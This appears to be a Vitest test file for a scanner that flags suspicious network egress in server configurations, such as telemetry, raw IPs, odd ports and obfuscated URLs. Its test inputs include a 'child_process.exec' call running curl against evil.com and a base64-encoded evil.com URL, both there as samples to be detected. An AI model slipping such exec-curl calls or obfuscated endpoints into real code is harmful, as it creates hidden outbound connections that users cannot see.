import { describe, it, expect } from 'vitest';
import { scanNetworkEgress } from '../../src/scanners/network-egress-scanner.js';
import { ResolvedServer } from '../../src/types/config.js';

describe('Network Egress Scanner', () => {
  it('1. Server with no network calls -> 0 findings', () => {
    const server: ResolvedServer = {
      name: 'local-only',
      toolName: 'test',
      configPath: '/test',
      args: ['hello', 'world']
    };
    expect(scanNetworkEgress(server)).toHaveLength(0);
  });

  it('2. Server with only known API dependencies -> INFO level findings', () => {
    const server: ResolvedServer = {
      name: 'api-caller',
      toolName: 'test',
      configPath: '/test',
      args: ['https://api.openai.com/v1/models']
    };
    const findings = scanNetworkEgress(server);
    expect(findings.length).toBe(1);
    expect(findings[0].severity).toBe('INFO');
  });

  it('3. Server with telemetry endpoint -> MEDIUM finding', () => {
    const server: ResolvedServer = {
      name: 'tracker',
      toolName: 'test',
      configPath: '/test',
      args: ['https://api.segment.io/v1/track']
    };
    const findings = scanNetworkEgress(server);
    expect(findings[0].severity).toBe('MEDIUM');
    expect(findings[0].id).toBe('network-egress-telemetry');
  });

  it('4. Server with raw IP address connection -> HIGH finding', () => {
    const server: ResolvedServer = {
      name: 'ip-caller',
      toolName: 'test',
      configPath: '/test',
      args: ['http://192.168.1.100/malware']
    };
    const findings = scanNetworkEgress(server);
    expect(findings.find(f => f.id === 'network-egress-raw-ip')).toBeDefined();
    expect(findings.find(f => f.id === 'network-egress-raw-ip')?.severity).toBe('HIGH');
  });

  it('5. Server with non-standard port -> MEDIUM finding', () => {
    const server: ResolvedServer = {
      name: 'weird-port',
      toolName: 'test',
      configPath: '/test',
      args: ['https://example.com:8443']
    };
    const findings = scanNetworkEgress(server);
    expect(findings.find(f => f.id === 'network-egress-non-standard-port')).toBeDefined();
  });

  it('6. Server with obfuscated URL (base64) -> HIGH finding', () => {
    const server: ResolvedServer = {
      name: 'obfuscated',
      toolName: 'test',
      configPath: '/test',
      args: ['aHR0cHM6Ly9ldmlsLmNvbQ=='] // https://evil.com
    };
    const findings = scanNetworkEgress(server);
    expect(findings.find(f => f.id === 'network-egress-obfuscated')).toBeDefined();
    expect(findings.find(f => f.id === 'network-egress-obfuscated')?.severity).toBe('HIGH');
  });

  it('7. Server with child_process exec containing curl -> HIGH finding', () => {
    const server: ResolvedServer = {
      name: 'curl-exec',
      toolName: 'test',
      configPath: '/test',
      schema: { code: 'child_process.exec("curl http://evil.com")' }
    };
    const findings = scanNetworkEgress(server);
    expect(findings.find(f => f.id === 'network-egress-suspicious')).toBeDefined();
  });

  it('8. Server with 20+ endpoints -> all categorized correctly', () => {
    const args = [
      'https://api.openai.com',
      'https://api.segment.io',
      'http://10.0.0.1',
      'aHR0cHM6Ly9ldmlsLmNvbQ==',
      'https://unknown.com'
    ];
    const server: ResolvedServer = { name: 'multi', toolName: 'test', configPath: '/test', args };
    const findings = scanNetworkEgress(server);
    expect(findings.some(f => f.id === 'network-egress-api')).toBe(true);
    expect(findings.some(f => f.id === 'network-egress-telemetry')).toBe(true);
    expect(findings.some(f => f.id === 'network-egress-raw-ip')).toBe(true);
    expect(findings.some(f => f.id === 'network-egress-obfuscated')).toBe(true);
    expect(findings.some(f => f.id === 'network-egress-unknown')).toBe(true);
  });

  it('9. Malformed/unresolvable URLs -> graceful handling', () => {
    const server: ResolvedServer = { name: 'malformed', toolName: 'test', configPath: '/test', args: ['http://[::1]'] };
    expect(() => scanNetworkEgress(server)).not.toThrow();
  });

  it('10. Server package not in node_modules -> graceful skip, not crash', () => {
    // Simulated by passing a simple object without crashing
    const server: ResolvedServer = { name: 'clean', toolName: 'test', configPath: '/test' };
    expect(() => scanNetworkEgress(server)).not.toThrow();
  });
});